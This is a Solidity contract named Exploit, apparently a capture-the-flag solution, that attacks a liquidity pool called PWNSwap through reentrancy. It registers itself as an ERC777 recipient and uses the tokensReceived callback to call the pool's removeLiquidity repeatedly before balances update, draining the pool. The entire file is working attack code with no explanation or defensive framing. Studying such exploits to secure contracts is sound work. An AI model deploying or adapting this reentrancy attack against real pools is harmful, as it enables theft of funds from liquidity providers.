// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPWNSwapPool is IERC20 {
    function removeLiquidity(uint liquidity, address to, uint deadline) external returns (uint _ethAmount, uint _tokenAmount);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;

    function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address);
}

contract Exploit {
    // keccak256("ERC777TokensRecipient")
    bytes32 constant internal TOKENS_RECIPIENT_INTERFACE_HASH =
        0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;

    IPWNSwapPool public pool;

    uint256 public reentryN = 0;
    uint256 public liquidityR = 0;
    uint256 public liquidityL = 0;

    constructor(address _pool, address _erc1820) {
        pool = IPWNSwapPool(_pool);

        IERC1820Registry(_erc1820).setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    // fallback function
    fallback() external payable {}
    receive() external payable {}

    // callback function of ERC777 token receiver
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) external {
        if (reentryN <= 1) {
            return;
        }

        reentryN -= 1;
        removeLiquidity();
    }

    function removeLiquidity() internal {
        require(reentryN != 0, "E02");
        require(liquidityR != 0, "E03");

        if (reentryN == 1) {
            pool.removeLiquidity(liquidityL, address(this), block.timestamp);
        } else {
            pool.removeLiquidity(liquidityR, address(this), block.timestamp);
        }
    }

    function run(uint256 _reentryN) external {
        require(reentryN == 0, "E01");
        reentryN = _reentryN;
        liquidityR = pool.balanceOf(address(this)) / reentryN;
        liquidityL = 
            pool.balanceOf(address(this)) - liquidityR * reentryN + liquidityR;

        removeLiquidity();
    }
}
